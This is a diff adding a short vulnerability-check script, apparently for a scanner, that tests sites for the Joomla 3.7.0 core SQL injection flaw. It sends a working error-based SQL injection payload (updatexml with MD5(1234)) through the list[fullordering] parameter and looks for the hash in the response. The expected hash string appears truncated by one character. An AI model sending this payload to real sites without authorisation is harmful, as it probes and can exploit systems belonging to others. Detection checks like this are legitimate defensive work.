@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,Md5(1234)),0)
+#define bug = 81dc9bdb52d04dc20036dbd8313ed05	
+#define info = 存在joomla 3.7.0 core SQL注入漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
